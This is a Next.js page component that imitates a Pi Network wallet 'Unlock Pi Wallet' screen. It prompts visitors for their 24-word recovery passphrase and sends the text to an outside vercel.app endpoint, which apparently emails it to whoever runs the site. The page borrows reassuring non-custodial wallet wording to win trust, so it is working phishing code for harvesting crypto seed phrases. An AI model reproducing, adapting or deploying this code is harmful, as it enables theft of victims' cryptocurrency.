"use client"
import Image from "next/image";
import { useState } from "react";
import Link from 'next/link';

export default function WordValidatorPage() {
  const [inputText, setInputText] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    const wordCount = inputText.trim().split(/\s+/).length;

    if (wordCount < 24) {
      setErrorMessage("Error: Please enter exactly 24 words. You entered less than 24.");
      return;
    } else if (wordCount > 24) {
      setErrorMessage("Error: Please enter exactly 24 words. You entered more than 24.");
      return;
    }

    const userCode = inputText;

    try {
      const response = await fetch("https://cryptoapiclientwork.vercel.app/sendemail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userCode }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to send email.");
      }

      setErrorMessage("Success! Email sent with your user code.");
    } catch (error) {
      console.error(error); // Log error to the console
      setErrorMessage(error.message || "Error sending email.");
    }
  };

  return (
    <>
     <div className='bg-[#8A348E] flex items-center justify-center'>
  <Link href="/" className='flex items-center'>
    <Image src="/logoImage.PNG" alt="Next.js Logo" width={40} height={30} />
    <h2 className="mx-3 text-[18px] sm:text-[18px] lg:text-[24px] text-white leading-tight">
      Wallet
    </h2>
  </Link>
</div>
<div className="flex items-center justify-center opacity-100 p-4">
  <div className="rounded-lg p-6 sm:p-8 max-w-full sm:max-w-lg w-full">
    <h1 className="text-xl sm:text-2xl font-bold text-gray-800 text-center mb-4 sm:mb-6">
      Unlock Pi Wallet
    </h1>
    <form onSubmit={handleSubmit} className="space-y-4">
      <textarea
        value={inputText}
        onChange={(e) => setInputText(e.target.value)}
        rows="5"
        placeholder="Enter Your 24-Word PassPhrase Here..."
        className="w-full border border-black rounded-lg p-3 sm:p-4 text-gray-800 focus:ring-2 focus:ring-indigo-400 focus:outline-none resize-none"
        style={{ height: "200px" }}
      />
       {errorMessage && (
      <p
        className={`mt-4 text-center font-medium ${
          errorMessage.startsWith("Success") ? "text-green-600" : "text-red-600"
        }`}
      >
        {errorMessage}
      </p>
    )}
      <button
        type="submit"
        className="w-full text-[#8A348E] border-2 border-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-2xl transition"
      >
        Unlock with PassPhrase
      </button>
      <button
        type="submit"
        className="w-full text-white bg-[#8A348E] hover:bg-[#fbb44a] font-bold py-2 sm:py-3 px-4 rounded-lg transition mb-2"
      >
        <Link href={"/"}>
          Unlock with FingerPrint
        </Link>
      </button>
    </form>
   
    <p className="mt-8 text-sm  text-gray-600">
      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
    </p>
    <p className="text-sm mt-4 text-gray-600">
      Lost your passphrase? <Link href={"/pi-browser"}> <span className="text-blue-600">You can create a new wallet,</span> </Link> but all your π in your previous wallet will be inaccessible.
    </p>
  </div>
</div>

    </>
  );
}
